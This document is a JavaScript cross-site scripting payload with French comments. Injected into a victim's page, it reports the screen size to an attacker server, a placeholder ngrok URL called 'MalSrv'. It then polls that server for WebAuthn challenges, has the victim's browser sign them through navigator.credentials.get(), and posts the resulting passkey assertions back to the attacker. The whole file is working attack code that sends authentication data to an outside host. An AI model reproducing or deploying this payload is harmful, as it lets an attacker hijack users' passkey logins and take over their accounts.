(async function() {
    console.log('[xssPayload] Initializing...');
    
    // Configuration - REMPLACER par l'URL ngrok réelle
    const MalSrv = 'https://VOTRE-NGROK-URL.ngrok-free.app';
    
    console.log(`[xssPayload] MalSrv: ${MalSrv}`);
    
    // ==================== FONCTIONS UTILITAIRES ====================
    
    function arrayBufferToBase64(buffer) {
        const bytes = new Uint8Array(buffer);
        let binary = '';
        for (let i = 0; i < bytes.byteLength; i++) {
            binary += String.fromCharCode(bytes[i]);
        }
        return btoa(binary);
    }
    
    function serializeAssertion(assertion) {
        return {
            id: assertion.id,
            rawId: arrayBufferToBase64(assertion.rawId),
            response: {
                authenticatorData: arrayBufferToBase64(assertion.response.authenticatorData),
                clientDataJSON: arrayBufferToBase64(assertion.response.clientDataJSON),
                signature: arrayBufferToBase64(assertion.response.signature),
                userHandle: assertion.response.userHandle ?
                    arrayBufferToBase64(assertion.response.userHandle) : null
            },
            type: assertion.type
        };
    }
    
    // ==================== ÉTAPE 1: ENVOYER TAILLE ÉCRAN ====================
    
    try {
        const screenData = {
            width: window.innerWidth,
            height: window.innerHeight
        };
        
        console.log('[xssPayload] Sending screen size:', screenData);
        
        await fetch(`${MalSrv}/postScreenSize`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(screenData)
        });
        
        console.log('[xssPayload] Screen size sent successfully');
        
    } catch (err) {
        console.error('[xssPayload] Error sending screen size:', err);
    }
    
    // ==================== ÉTAPE 2: POLLING LOOP ====================
    
    console.log('[xssPayload] Starting polling loop (1000ms interval)');
    
    let pollCount = 0;
    
    setInterval(async () => {
        pollCount++;
        
        try {
            // Récupérer challenge depuis MalSrv
            const res = await fetch(`${MalSrv}/getChallenge`, {
                method: 'GET',
                headers: { 'Content-Type': 'application/json' }
            });
            
            if (res.status === 204) {
                // Pas de challenge disponible
                if (pollCount % 10 === 0) {
                    console.log(`[xssPayload] Still polling... (${pollCount}s)`);
                }
                return;
            }
            
            if (!res.ok) {
                console.error('[xssPayload] Error fetching challenge:', res.status);
                return;
            }
            
            const chObj = await res.json();
            console.log('[xssPayload] ✅ Challenge received!', chObj);
            
            // ==================== ÉTAPE 3: APPELER WEBAUTHN LOCAL ====================
            
            console.log('[xssPayload] Calling navigator.credentials.get() LOCAL...');
            
            const assertion = await navigator.credentials.get({
                publicKey: chObj
            });
            
            console.log('[xssPayload] ✅ Assertion generated!', assertion);
            
            // ==================== ÉTAPE 4: SÉRIALISER ====================
            
            console.log('[xssPayload] Serializing assertion...');
            const serialized = serializeAssertion(assertion);
            console.log('[xssPayload] Serialized assertion:', serialized);
            
            // ==================== ÉTAPE 5: ENVOYER À MALSRV ====================
            
            console.log('[xssPayload] Sending assertion to MalSrv...');
            
            const postRes = await fetch(`${MalSrv}/postResult`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(serialized)
            });
            
            if (postRes.ok) {
                console.log('[xssPayload] ✅ Assertion sent successfully!');
            } else {
                console.error('[xssPayload] Error sending assertion:', postRes.status);
            }
            
        } catch (err) {
            console.error('[xssPayload] Error in polling loop:', err);
        }
        
    }, 1000); // Poll toutes les 1 seconde
    
    console.log('[xssPayload] Initialization complete. Polling active.');
    
})();